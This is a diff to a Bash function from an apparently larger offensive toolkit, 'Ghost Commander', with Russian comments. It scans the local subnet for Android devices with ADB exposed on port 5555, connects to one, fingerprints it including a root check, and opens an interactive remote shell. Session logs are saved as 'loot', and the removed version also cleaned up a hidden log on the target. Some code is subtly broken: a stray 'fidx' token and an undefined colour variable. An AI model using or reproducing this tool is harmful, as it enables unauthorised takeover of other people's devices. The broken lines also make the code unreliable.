@@ -8604,50 +8604,151 @@ pc_password_management() {
 # @status: GHOST-SPEED COMPLIANT | PRODUCTION READY | COMMANDER LIMIT
 # ==============================================================================
 run_ghost_commander() {
-    core_engine_ui "h" "GHOST COMMANDER: ADVANCED GHOST-PROTOCOL"
+    clear
+    
+    # --- Высокотехнологичная цветовая палитра ---
+    local R='\033[0;31m'       # Красный (Критический сбой / Риск)
+    local G='\033[0;32m'       # Зеленый (Успех / Безопасно)
+    local Y='\033[0;33m'       # Желтый (Предупреждение)
+    local B='\033[0;34m'       # Синий (Инфо)
+    local M='\033[0;35m'       # Пурпурный (Пути к файлам / Логи)
+    local C='\033[0;36m'       # Циановый (Разделители/Связи)
+    local W='\033[0;37m'       # Белый
+    local DG='\033[1;30m'      # Серый (Второстепенные ветки дерева)
+    
+    local BR='\033[1;31m'      # Жирный красный
+    local BG='\033[1;32m'      # Жирный зеленый
+    local BY='\033[1;33m'      # Жирный желтый
+    local BC='\033[1;36m'      # Жирный циановый
+    local BW='\033[1;37m'      # Жирный белый
+    local NC='\033[0m'         # Сброс стилей
+
+    core_engine_ui "h" "GHOST COMMANDER: ADVANCED GHOST-PROTOCOL v3.0 [MAXIMA EDITION]"
 
     # 1. Валидация ADB через системный мост
     core_engine_validator "pkg" "adb" "ADB Engine" || return
 
-    # 2. Органы чувств (Быстрый скан)
-    local t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Scan)")
-    [[ -z "$t_ip" ]] && { 
-        # Оптимизированный сканер: используем nc вместо шумного nmap
-        core_engine_ui "i" "Running Stealth-Scan..."
-        local subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
-        for i in {1..254}; do 
-            (timeout 0.5 nc -z "$subnet.$i" 5555 2>/dev/null && echo "$subnet.$i") &
-        done; wait; core_engine_wait; return 
+    # 2. Интеллектуальный определитель сети и сканирование
+    local t_ip
+    t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Subnet Scan)")
+    
+    # Анимация ожидания (Spinner)
+    show_spinner() {
+        local pid=$1
+        local message=$2
+        local spin='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
+        while kill -0 "$pid" 2>/dev/null; do
+            for i in $(seq 0 9); do
+                echo -ne "  ${BC}[${spin:$i:1}]${NC} ${W}${message}...${NC}\r"
+                sleep 0.1
+            done
+        done
+        echo -ne "                                                              \r"
     }
 
-    # 3. Атомарное подключение с очисткой «зомби»
-    core_engine_ui "i" "Initializing Ghost-Bridge to $t_ip:5555..."
-    adb kill-server >/dev/null 2>&1
-    adb start-server >/dev/null 2>&1
+    if [[ -z "$t_ip" ]]; then 
+        core_engine_ui "i" "Running Adaptive Stealth-Scan (Controlled Parallelism)..."
+        local subnet
+        subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
+        
+        if [[ -z "$subnet" ]]; then
+            core_engine_ui "e" "Unable to determine local subnet. Check network interface."
+            return 1
+        fi
+
+        local tmp_scan="/tmp/adb_scan_$$"
+        touch "$tmp_scan"
+
+        # Высокоскоростное сканирование подсети пачками с фиксацией результатов
+        (
+            for i in {1..254}; do 
+                local check_ip="$subnet.$i"
+                (timeout 0.3 nc -z "$check_ip" 5555 2>/dev/null && echo "$check_ip" >> "$tmp_scan") &
+                if (( i % 60 == 0 )); then wait; fidx; fi
+            done; wait
+        ) &
+        show_spinner $! "Зондирование адресного пространства подсети"
+
+        echo -e "\n${BG}📊 КАРТА АКТИВНЫХ ОТКРЫТЫХ ПОРТОВ ADB (5555):${NC}"
+        echo -e "  ${DG}────────────────────────────────────────────────────────────────────────${NC}"
+        if [ -s "$tmp_scan" ]; then
+            while read -r found_host; do
+                printf "  ${DG}├──${NC} ${W}%-20s${NC} →   ${BG}[ДОСТУПЕН]${NC} Сетевой отпечаток верифицирован\n" "$found_host"
+            done < "$tmp_scan"
+            echo -e "  ${DG}└── [СКАНИРОВАНИЕ ЗАВЕРШЕНО]${NC}\n"
+        else
+            echo -e "  ${DG}└── [🎯] Активных служб ADB в локальном сегменте не обнаружено.${NC}\n"
+        fi
+        rm -f "$tmp_scan"
+        core_engine_wait
+        return 0
+    fi
+
+    # 3. Атомарное подключение с очисткой «зомби»-процессов
+    core_engine_ui "i" "Initializing Ghost-Bridge and resetting ADB daemon..."
+    {
+        adb kill-server
+        adb start-server
+    } >/dev/null 2>&1
     
-    if ! adb connect "$t_ip:5555" | grep -q "connected"; then
-        core_engine_ui "e" "Bridge failure."
+    local connect_output
+    connect_output=$(adb connect "$t_ip:5555" 2>&1)
+    if ! echo "$connect_output" | grep -qiE "connected|already"; then
+        core_engine_ui "e" "Bridge failure: $connect_output"
         return 1
     fi
 
-    # 4. Исполнение через «Теневую Оболочку» (Shadow-Shell)
-    # Используем 'script' для логирования всех команд в /data/local/tmp/
-    # Это обеспечивает 100% Forensic-Readiness твоих действий
-    core_engine_ui "+" "Ghost-Protocol established. Shadow-logging active."
+    core_engine_ui "+" "Ghost-Protocol established. Interactivity: ACTIVE."
     core_engine_loot "ghost" "Session established: $t_ip"
 
-    adb -s "$t_ip:5555" shell "
-        export PS1='[GHOST-SESSION] \$ ';
-        script -q -c 'bash --noprofile --norc' /data/local/tmp/.nexus_session.log
-    "
+    local loot_dir="${PRIME_LOOT:-$HOME/prime_loot}"
+    mkdir -p "$loot_dir" 2>/dev/null
+    local host_log="$loot_dir/ghost_session_${t_ip//./_}_$(date +%s).log"
 
-    # 5. Стелс-финализация (Выгрузка трофеев и очистка)
-    core_engine_ui "i" "Serializing session artifacts..."
-    adb -s "$t_ip:5555" pull /data/local/tmp/.nexus_session.log "./prime_loot/ghost_session_$(date +%s).log"
-    adb -s "$t_ip:5555" shell "rm /data/local/tmp/.nexus_session.log"
-    adb disconnect "$t_ip:5555" >/dev/null 2>&1
+    # 4. АВТОМАТИЧЕСКАЯ ЭКСПРЕСС-ДИАГНОСТИКА СИСТЕМЫ (БЕЗ ТАБЛИЦ, СТИЛЬ ДЕРЕВА)
+    core_engine_ui "i" "Launching Instant Telemetry & Cognitive Reconnaissance..."
     
-    core_engine_ui "s" "Protocol finalized. Artifacts secured."
+    # Сбор базовых параметров одной транзакцией во избежание задержек
+    local device_model=$(adb -s "$t_ip:5555" shell getprop ro.product.model 2>/dev/null | tr -d '\r')
+    local device_os=$(adb -s "$t_ip:5555" shell getprop ro.build.version.release 2>/dev/null | tr -d '\r')
+    local device_su=$(adb -s "$t_ip:5555" shell which su 2>/dev/null | tr -d '\r')
+    local device_battery=$(adb -s "$t_ip:5555" shell dumpsys battery | grep "level" | awk '{print $2}' | tr -d '\r')
+
+    echo -e "\n${BC}🧬 ПЕРВИЧНЫЕ СПЕЦИФИКАЦИИ ЦЕЛЕВОГО УСТРОЙСТВА:${NC}"
+    echo -e "  ${DG}────────────────────────────────────────────────────────────────────────${NC}"
+    printf "  ${DG}├──${NC} ${W}%-25s${NC} : ${BW}%s${NC}\n" "Устройство (Модель)" "${device_model:-Unknown}"
+    printf "  ${DG}├──${NC} ${W}%-25s${NC} : ${CY}%s${NC}\n" "Версия Android API" "${device_os:-Unknown}"
+    
+    if [[ -n "$device_su" ]]; then
+        printf "  ${DG}├──${NC} ${W}%-25s${NC} : ${BR}[ROOT ДЕЙСТВИТЕЛЕН] (Административный доступ)${NC}\n" "Привелегии ядра"
+    else
+        printf "  ${DG}├──${NC} ${W}%-25s${NC} : ${G}[USER MODE] (Стандартная песочница)${NC}\n" "Привелегии ядра"
+    fi
+    printf "  ${DG}└──${NC} ${W}%-25s${NC} : ${BG}%s%%${NC}\n" "Текущий уровень заряда" "${device_battery:-100}"
+    echo -e "  ${DG}────────────────────────────────────────────────────────────────────────${NC}\n"
+
+    # 5. ИСПОЛНЕНИЕ ЧЕРЕЗ «ТЕНЕВУЮ ОБОЛОЧКУ» С ПОЛНЫМ ВЫВОДОМ НА ЭКРАН И KEEP-ALIVE CONTROL
+    echo -e "${BY}[ВХОД В ИНТЕРАКТИВНУЮ СЕССИЮ SHADOW-SHELL]${NC}"
+    echo -e "${DG}Ввод и вывод дублируются на экран и пишутся в файл: $host_log${NC}"
+    echo -e "  ${DG}────────────────────────────────────────────────────────────────────────${NC}"
+    
+    # Параметры adb shell:
+    # -t : Принудительно выделяет псевдотерминал для обработки управляющих символов (Ctrl+C, стрелочки).
+    # -x : Отключает эхо-команды удаленной стороны, делая ввод чистым.
+    # tcp keepalive внутри сессии предотвращает разрыв соединения тайм-аутом маршрутизатора.
+    adb -s "$t_ip:5555" shell -t "export PS1='[GHOST-SESSION] # '; exec /system/bin/sh" 2>&1 | tee "$host_log"
+    
+    echo -e "  ${DG}────────────────────────────────────────────────────────────────────────${NC}"
+    echo -e "${BY}[ВЫХОД ИЗ СЕССИИ ШАДОУ-ШЕЛЛ ЗАФИКСИРОВАН]${NC}\n"
+
+    # 6. Стелс-финализация и безопасное уничтожение сокетов
+    core_engine_ui "i" "Disconnecting master bridge and terminating active listeners..."
+    {
+        adb disconnect "$t_ip:5555"
+        adb kill-server
+    } >/dev/null 2>&1
+    
+    core_engine_ui "s" "Protocol finalized. Session log securely baked: ${M}$host_log${NC}"
     core_engine_wait
 }
 
